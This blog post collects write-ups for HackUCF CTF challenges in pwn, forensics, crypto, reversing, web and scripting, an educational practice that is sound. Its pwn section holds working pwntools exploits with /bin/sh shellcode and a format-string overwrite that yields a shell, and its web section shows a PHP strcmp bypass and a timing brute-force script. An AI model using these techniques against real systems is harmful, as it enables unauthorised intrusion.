---
layout: post
title: HACKUCF CTF Writeups
tags: [pwn, misc, reverse, forensics]
comments: true
---

# PWN
### bof1
5 points

netcat to the server and print out 100 characters, we get the flag!

> Flag: **flag{my_first_buffer_overflow!}**

### stack0 pt1
5 points

overflow the didPurchase value by print many characters to get the flag.

> Flag: **flag{babys_first_buffer_overflow}**

### heap0
10 points

shell and username's addresses are leaked, their distance is 0x38, so we can change the value of shell if we input more than 0x38 character. 

get shell by input 'A'*0x38+'sh'

> Flag: **flag{heap_challenges_are_not_as_scary_as_most_people_think}**

### Log Me In!
15 points

connect to server, we get the variable **user**'s address.

use format string vulnerability to change the variable **user**'s address value, we get the flag.

> Flag: **flag{why_does_printf_even_have_%n}**


### bof2
20 points

overflow the correct value with **_0xdeadbeef_**

> Flag: **flag{buffers_and_beef_make_for_a_yummie_pwn_steak}**


### bof3
25 points

overflow the fp pointer value with address of **win** function

> Flag: **flag{time_to_get_out_of_the_kiddie_pool}**


### ret
50 points

return, return, return

>Flag: **flag{no_you_suck!:P}**

### mem_test
75 points

return to **win** function with the parameter of **_hint_** to get shell

> Flag: **sorry I forgot the flag**

### super stack
100 points

the stack address is leaked for us, so we can input shellcode and return to it.

shellcode must not contain _scanf_'s bad char and the return address is a pointer to a pointer to shellcode.

```python
from pwn import *

host, port = "ctf.hackucf.org",9005

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x2c\xf5\xcd\x80'
p = remote(host, port)
#p = process('super_stack')
buff = int(p.recvuntil(b'\n').replace(b'\n',b'').split(b' ')[1],16)
print(hex(buff))
print(hex(buff+4))
payload = b''
payload += p32(buff+4)
payload += b'\x90'*(0x60-len(shellcode))
payload += shellcode
payload += p32(buff+4)

payload += p32(0x41414141)

print(payload)
p.sendline(payload)
p.interactive()
```

> Flag: **flag{not_a_bird_not_a_plane_just_a_stack}**

### stack0 pt2
100 points

shellcode and return

```python 
from pwn import *
host, port = "ctf.hackucf.org", 32101

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x2c\xf5\xcd\x80'
p = remote(host, port)
#p = process('super_stack')
buff = int(p.recvuntil(b'\n').replace(b'\n',b'').split(b'= ')[1],16)
print(hex(buff))

payload = b''
payload += b'\x90'*0x10
payload += shellcode
payload += b'\x90'*(0x43-0x4-len(shellcode)-0x10)
payload += p32(buff)

print(payload)
p.sendline(payload)
p.interactive()
```

> Flag: **flag{what_is_this_flag_you_speak_of}**


### Restricted Shell
125 points

the program runs a restricted shell that allows you to use some commands like _uname_, _id_, ...

reading the binary, we can see that there is a format string bug, so we can abuse this to change the **id** command to **sh** command, which will give us shell.

```python
from pwn import *

host, port = "ctf.hackucf.org",7007

p = remote(host, port)
#id  =>> sh
iAdd = 0x0804b369
dAdd = 0x0804b36a
payload = b''
payload +=p32(dAdd)
payload +=p32(iAdd)
payload += bytearray('%{}x%5$hhn'.format(ord('h')-8).encode('ascii'))
payload += bytearray('%{}x%6$hhn'.format(ord('s')-ord('h')).encode('ascii'))
print(payload)
p.sendline(b'prompt')
p.sendline(payload)
p.sendline(b'id')
p.interactive()
```

> Flag: **flag{not_such_a_restrictive_shell_after_all}**

# Forensics
### Tay
10 points

strings the file, we get a base64 string, decode it to get flag

> Flag: **flag{n4z1_s3x-r0b07}**

### rabbit-hole
30 points

decompress the file multiple times to get flag

> Flag: **flag{c0mpr3ss10n_1s_fun}**

### Data Exfil
100 points

inspect pcap by Wireshark, we can see some inspicious DNS packets with some hex content.

extract them we can get a zipfile which contains the flag

> Flag: **sun{w0w_I_dns_s33_y0u_1n_h3r3}**

### My Secret Stash
100 points

this is a git repo, using some GoogleFu we can manage to see some deleted stash by using the command:
```linux
git fsck --unreachable | grep commit | cut -d ' ' -f3 | xargs git log --merges --no-walk
```
this command list lost stash then recover it.

> Flag: **sun{git_gud_k1d}**

### High Aptitude
150 points

use a program call [SeaTTY](http://www.dxsoft.com/en/products/seatty/) which is used to inspect Fax sound

> Flag: **flag{email_is_way_easier}**

### Old Favorites
150 points

extract mp3 sound from the mp4 file, then use [Sonic Visualizer](http://www.dxsoft.com/en/products/seatty/) to view spectrogram, we get the flag.

> Flag: **sun{you_know_the_rules}**

### Old Favorites 2
300 points

use vbindiff to inspect the different between 2 files, we see that some hex values have been changed. this seems like a LSB technique, so I get the hex diffs and decode it to get the flag

![hexdiff 2 files](https://i.ibb.co/kcM5ktd/vbindiff.png "Old_fav")
write a simple python code to bruteforce the flag:

```python
from textwrap import wrap
#Extract the binary
with open('OF2.txt', 'rb') as fp:
    hex_list=[]
    lsb=''
    tmp = fp.read(2)
    while tmp:
        hex_list.append(tmp)
        fp.read(1)
        tmp=fp.read(2)
    print(hex_list)
    for i in range (0,len(hex_list)):
        if(int(hex_list[i],16)%2==0):
            lsb+='0'
        else:
            lsb+='1'
    print(lsb)
    #decode it
    for i in range(0, 8):
        bin_list = wrap(lsb[i:],8)
        decode_string=''
        for bin in bin_list:
            decode_string+= chr(int(bin,2))
        print(decode_string)
```


> Flag: **sun{dont_3e_blind}**

# Crypto
### xorly
10 points

c = m xor k => c xor m = m xor k xor m = k

hence we get the key is **fish**, we can decode the flag

> Flag: **flag{xor_is_the_new_aes}**

### Visionary
150 points

from the table given we can expect that the encrypt rule is _plaintext + key = ciphertext_

combining each character in the row and column gives us a corresponding character (just like the xor operand)

write a python code to help us get the key and decode the flag

```python
def get_key(val,my_dict):
    for key, value in my_dict.items():
         if val == value:
             return key
 
    return "key doesn't exist"

def readFile(f):
    tmp = f.read(1)
    array=[]
    while(tmp!='\n'):
        array.append(tmp)
        tmp = f.read(1)
    return array


string = '! \" # $ % & \' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \\ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~'
list = string.split(" ")
n = len(list)
list_dict = {}
for i in range(0,len(list)):
    list_dict[list[i]] = i


file1 = open("Cipher1.txt","r",encoding='utf-8')
file2 = open("Decipher(Cipher1).txt","r",encoding='utf-8')
file3 = open("cipherFlag.txt","r",encoding='utf-8')

c = readFile(file1)
d = readFile(file2)
ci = readFile(file3)

key = []
index = 0
for i in range(0,229):
     index=list_dict[d[i]]-list_dict[c[i]]
     if (index<0):
         index+=94
     key.append(get_key(index,list_dict))

print(key)

dec=""
for i in range (0,len(ci)):
    index = list_dict[ci[i]]+list_dict[key[i]]
    if (index>93):
        index-=94
    dec+=get_key(index,list_dict)

print(dec)

```

> Flag: **flag{xor_is_the_new_aes}**

# RE
Some of the first challenges are really easy, just basically read the binary to get flag, so I'll skip it.
### Source Protection
50 points

The hint tells that the program was written by Python, so after doing some researchs, I managed to decompile the executable file to pyc, by using open source tools like [uncompyle2](https://github.com/Mysterie/uncompyle2).

After you extract the pyc file, grep the file for flag.

> Flag: **sun{py1n574ll3r_15n7_50urc3_pr073c710n}**

### Order matters
50 points

open Ghidra and we can see that the password is the permutation of 15 different strings (which are base64 encoded).

we can bruteforce it or do it manually to get the flag.

> Flag: **sun{mY_IDA_bR1ngS_a11_Th3_B0ys_t0_tH3_y4rD}**

### Moody Numbers

100 points

decompile jar file back to java, we can easily read the source to bypass the 4 challenges.

> Flag: **flag{th1s_1s_why_c0mpu73rs_d0n7_h4v3_f33l1ng5}**

### WTF?
100 points

the ELF file is corrupted, so I changed some first bytes of an ELF file and read the binary with IDA to get the flag.

> Flag: **flag{headers_are_fun}**

# WEB
### strcmp
20 points

```php
$input = $_GET["passwd"];

   $password = "CENSORED";

   if (strcmp($input, $password) == 0) {
     echo("$password");
   }
```

if we give get request something like this passwd[]=0 then the $passwd becomes an array, then if strcmp compares this, instead of throwing an error, it returns NULL

since it's php and NULL == 0 in php so we bypass the check and get the flag

> Flag: **flag{php_is_really_really_well_designed}**

### strcmp
20 points

```php
$input = $_GET["passwd"];

   $password = "CENSORED";

   if (strcmp($input, $password) == 0) {
     echo("$password");
   }
```

if we give get request something like this passwd[]=0 then the $passwd becomes an array, then if strcmp compares this, instead of throwing an error, it returns NULL

since it's php and NULL == 0 in php so we bypass the check and get the flag

> Flag: **flag{php_is_really_really_well_designed}**

### Superhacker part 1
25 points

```php
$flag1 = "[REDACTED]";
$flag2 = "[REDACTED]";
if(array_key_exists("username",$_REQUEST)){
    $link = mysqli_connect('localhost','challenge','[REDACTED]');
    $uName = $_REQUEST['username'];
    $pass = $_REQUEST['password'];

    mysqli_select_db($link,'toPwn');
    $statement = "SELECT * FROM users WHERE username = '$uName' AND password = '$pass'";
    $res = mysqli_query($link,$statement);
    if(array_key_exists("iamahacker",$_GET)){
        echo "$flag1 ";
        if(array_key_exists("debug",$_GET)){
            echo "$statement ";
        }
        if(mysqli_num_rows($res) > 0){
            echo "$flag2" ;
        }
    }else{
        echo 'nope!';
    }
    mysqli_close($link);
    
```

flag1 is echoed if REQUEST has the field _"username"_ and the field  _"iamahacker"_ in a GET REQUEST

send a GET REQUEST instead of POST with correct field to get the flag

> Flag: **flag{r3qu35t_f0r_f14g_gr4n73d}**


### calc
50 points

write a simple code to do the calculation for us

```python
from requests_html import HTMLSession
from bs4 import BeautifulSoup
import operator

def parse(x):
    operators = set('+-*/')
    op_out = []    #This holds the operators that are found in the string (left to right)
    num_out = []   #this holds the non-operators that are found in the string (left to right)
    buff = []
    for c in x:  #examine 1 character at a time
        if c in operators:  
            #found an operator.  Everything we've accumulated in `buff` is 
            #a single "number". Join it together and put it in `num_out`.
            num_out.append(''.join(buff))
            buff = []
            op_out.append(c)
        else:
            #not an operator.  Just accumulate this character in buff.
            buff.append(c)
    num_out.append(''.join(buff))
    return num_out,op_out

def my_eval(nums,ops):

    nums = list(nums)
    ops = list(ops)
    operator_order = ('*/','+-')  #precedence from left to right.  operators at same index have same precendece.
                                  #map operators to functions.
    op_dict = {'*':operator.mul,
               '/':operator.truediv,
               '+':operator.add,
               '-':operator.sub}
    Value = None
    for op in operator_order:                   #Loop over precedence levels
        while any(o in ops for o in op):        #Operator with this precedence level exists
            idx,oo = next((i,o) for i,o in enumerate(ops) if o in op) #Next operator with this precedence         
            ops.pop(idx)                        #remove this operator from the operator list
            values = map(float,nums[idx:idx+2]) #here I just assume float for everything
            value = op_dict[oo](*values)
            nums[idx:idx+2] = [value]           #clear out those indices

    return nums[0]

url = "http://ctf.hackucf.org:4000/calc/calc.php"

session = HTMLSession()

r = session.get(url)
#print(r.text)
strings = r.html.find('expression')
#print(strings[0].text)
cal = "".join(strings[0].text.split())
result=int(my_eval(*parse(cal)))

data= {'answer':result}
flag = session.post(url,data=data)

print(flag.text)

```

> Flag: **flag{you_should_have_solved_this_in_ruby}**

### bad code
75 points

playing around the web, I notice that everytime we input something, the server return response with the **_executed time_**, maybe we could use this.

since the time changes when we input the right characters, so I write a script to bruteforce this

```python
from requests_html import HTMLSession

url = "http://ctf.hackucf.org:4000/bad_code/bad_code.php?passwd="

string = 'A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9'
list = string.split(' ')
print(list)
timing = 0.012
while(True):
    for i in range(0,len(list)):
        session = HTMLSession()
        r = session.get(url+list[i])
        time = r.html.find('time')
        print(url+list[i])
        print(time[0].text)
        if(float(time[0].text) > timing):
            print(list[i])
            url+=list[i]
            timing = float(time[0].text) + 0.01
            break
```

> Flag: **flag{i_stole_this_challenge_idea_from_someone_else}**

# Scripting
### Repetition 1
10 points

using pwntools to write a python code that repeats the numbers

the tricky thing here is the limited time, so I have to inspect the location of the server and ssh to another machine near that location to get the flag in time (maybe these challenges are not meant for foreigners ;_;)

SINCE I DON'T HAVE THE MACHINE ANYMORE SO THE OTHER CHALLENGES CAN'T BE SOLVED :(

> Flag: **flag{again_and_again_and_again_and_again**

~ THE END ~ 
